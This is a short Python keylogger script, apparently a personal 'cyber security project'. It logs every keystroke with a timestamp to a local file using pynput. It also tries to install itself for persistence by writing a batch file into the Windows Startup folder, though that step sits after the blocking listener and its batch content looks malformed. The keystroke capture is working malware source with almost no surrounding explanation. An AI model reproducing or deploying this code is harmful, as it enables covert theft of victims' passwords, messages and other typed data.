import pynput
from pynput.keyboard import Key, Listener
import logging
import os
import sys

log_dir = r"D:/cyber security/cyber security projects/keylogger"
logging.basicConfig(filename=(log_dir + r"/keylog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    try:
        logging.info(str(key))
    except Exception as e:
        logging.error(f"Error: {e}")

with Listener(on_press=on_press) as listener:
    listener.join()

# Auto-start mechanism (Windows)
script_path = os.path.abspath(sys.argv[0])
autostart_path = os.path.join(os.getenv('APPDATA'), 'Microsoft\Windows\Start Menu\Programs\Startup', 'keylogger.bat')

with open(autostart_path, 'w') as bat_file:
    bat_file.write(f'@echo off python "{script_path}"exit')
